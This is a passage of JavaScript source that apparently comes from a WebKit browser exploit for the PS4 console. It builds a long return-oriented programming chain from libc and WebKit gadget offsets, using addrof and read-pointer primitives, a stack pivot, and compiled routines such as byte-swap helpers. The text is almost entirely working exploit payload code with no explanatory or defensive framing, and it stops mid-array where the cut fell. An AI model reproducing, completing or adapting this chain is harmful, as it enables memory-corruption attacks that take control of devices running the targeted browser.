var ropchain_array = new Uint32Array(49710);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
set_gadgets([
libc_base+788575, //pop rax
ropchain+65720, //rdi_bak
webkit_base+14461559, //mov [rax], rdi
libc_base+206806, //pop rdi
ropchain+65680, //stack_bottom
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
ropchain+112, //ret_addr
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+184408, //_main
//ret_addr:
libc_base+811575, //pop rsp
ropchain+65680 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 128;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 16384;
//stack_bottom:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
main_ret,
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+65800, //L1
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+65888, //L2
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+65904, //L4
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L4:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L5:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+66024, //L8
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66008, //L6
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L6:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L8:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+66184, //L12
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66136, //L10
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66168, //L11
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L10:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L9:
db([16, 0]); // 0x10
set_gadget(libc_base+206806,); //pop rdi
//L11:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66240, //L14
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L14:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+66344, //L16
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+66376, //L17
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66360, //L15
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L15:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+66536, //L21
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66488, //L19
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66520, //L20
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L19:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L18:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L20:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66640, //L23
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66624, //L22
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66848, //L28
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66816, //L27
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L27:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L26:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66952, //L30
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66936, //L29
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+67032, //L31
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L31:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L33:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+67152, //L36
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67136, //L34
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L34:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L36:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+67312, //L40
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67264, //L38
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67296, //L39
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L38:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L37:
db([16, 0]); // 0x10
set_gadget(libc_base+206806,); //pop rdi
//L39:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+67368, //L42
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L42:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+67472, //L44
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+67504, //L45
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67488, //L43
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L43:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+67664, //L49
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67616, //L47
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67648, //L48
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L47:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L46:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L48:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+67768, //L51
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67752, //L50
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+67968, //L56
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67936, //L55
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L55:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L54:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68072, //L58
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+68056, //L57
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68184, //L61
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+68152, //L60
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L60:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L59:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68248, //L62
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L62:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+68304, //L64
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L64:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+68448, //L67
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68464, //L68
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+68432, //L66
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L66:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+68568, //L69
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68600, //L71
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68584, //L70
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68696, //L72
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68712, //L73
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68824, //L74
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68808, //L75
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+68912, //L77
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68896, //L76
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69008, //L78
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69024, //L79
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69136, //L80
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69120, //L81
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69208, //L83
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L83:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+69296, //L84
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69312, //L86
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L84:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L86:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L87:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+69432, //L90
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69416, //L88
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L88:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L90:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+69600, //L93
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69616, //L94
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69584, //L91
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69568, //L92
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L92:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+69712, //L96
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+69696, //L95
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69912, //L101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69880, //L100
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L100:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L99:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70016, //L103
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70000, //L102
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+70104, //L104
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L104:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L106:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+70224, //L109
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70208, //L107
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L107:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L109:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+70392, //L112
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+70408, //L113
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70376, //L110
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70360, //L111
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L111:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+70504, //L115
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70488, //L114
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L116:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+70616, //L118
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+70848, //L124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70816, //L123
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L123:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L122:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70952, //L126
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70936, //L125
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+71008, //L127
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71064, //L129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L129:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+71176, //L131
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L131:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L133:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+71296, //L136
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71280, //L134
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L134:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+71464, //L139
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+71480, //L140
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71448, //L137
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+71432, //L138
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L138:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+71576, //L142
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+71560, //L141
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L143:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71688, //L145
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
